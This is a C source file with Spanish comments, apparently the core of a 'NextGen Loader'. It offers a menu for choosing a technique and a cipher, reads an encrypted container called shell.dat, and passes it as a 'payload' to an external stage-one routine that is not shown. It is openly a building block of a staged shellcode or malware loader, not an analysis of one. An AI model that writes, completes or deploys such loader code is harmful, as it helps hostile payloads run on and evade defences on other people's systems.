// core/loader.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "menu.h"

#define CONTAINER_PATH "../core/shell.dat" //tushel o nombre del .dat aqui

extern void run_stage1(unsigned char *payload, size_t size);

// Lee el contenedor cifrado desde disco y lo pasa a stage1
int main() {
    printf("[+] NextGen Loader - Core\n");

    // Mostrar menu para elegir tecnica y cifrado
    show_main_menu();

    FILE *fp = fopen(CONTAINER_PATH, "rb");
    if (!fp) {
        fprintf(stderr, "[-] Error: no se pudo abrir %s\n", CONTAINER_PATH);
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t fsize = ftell(fp);
    rewind(fp);

    unsigned char *buffer = (unsigned char *)malloc(fsize);
    if (!buffer) {
        fprintf(stderr, "[-] Error: sin memoria\n");
        fclose(fp);
        return 1;
    }

    fread(buffer, 1, fsize, fp);
    fclose(fp);

    printf("[+] Contenedor leido (%zu bytes)\n", fsize);

    // Llamar a stage1 para procesar el payload
    run_stage1(buffer, fsize);

    free(buffer);
    return 0;
}
